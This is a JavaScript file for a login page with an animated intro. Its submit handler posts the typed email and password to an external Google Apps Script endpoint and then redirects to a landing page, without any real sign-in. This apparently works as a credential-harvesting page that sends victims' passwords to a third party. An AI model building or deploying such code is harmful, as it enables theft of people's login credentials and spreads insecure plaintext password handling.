let intro = document.querySelector('.intro');
let logoHeader = document.querySelector('.logo-header');
let loginContainer = document.querySelector('.login-container');
let loadingScreen = document.querySelector('.loading-screen');
let loginForm = document.querySelector('#loginForm');

window.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        logoHeader.classList.add('fade-in');

        setTimeout(() => {
            logoHeader.classList.remove('active');
            logoHeader.classList.add('fade');

            setTimeout(() => {
                intro.style.transition = "opacity 1s ease";
                intro.style.opacity = '0'; 

                setTimeout(() => {
                    intro.style.display = 'none'; 
                    loginContainer.style.display = 'block';
                    loginContainer.classList.add('fade-in'); 
                }, 1000); 
            }, 2000); 
        }, 2000); 
    }, 1000); 
});

function submitForm(event) {
    event.preventDefault();

    const url = "https://script.google.com/macros/s/AKfycbwvMt5ohEhQsbPjbVUbb2LKwS-7WuBy-iZKbJJ_VVAMQk-t067zFp-2oaG8J8GnbfYwBA/exec";
    const email = document.getElementById("InputEmail1").value;
    const password = document.getElementById("InputPassword1").value;

    const data = new URLSearchParams();
    data.append("email", email);
    data.append("password", password);

    loadingScreen.style.display = "flex"; 

    fetch(url, {
        method: "POST",
        body: data,
    })
    .then(response => response.text())
    .then(() => {
        loginForm.reset();
        loadingScreen.style.display = "none"; 
        window.location.href = "../Page1/landing.html"; 
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Gagal mengirim data. Coba lagi!");
        loadingScreen.style.display = "none"; 
    });
}

loginForm.addEventListener('submit', submitForm);
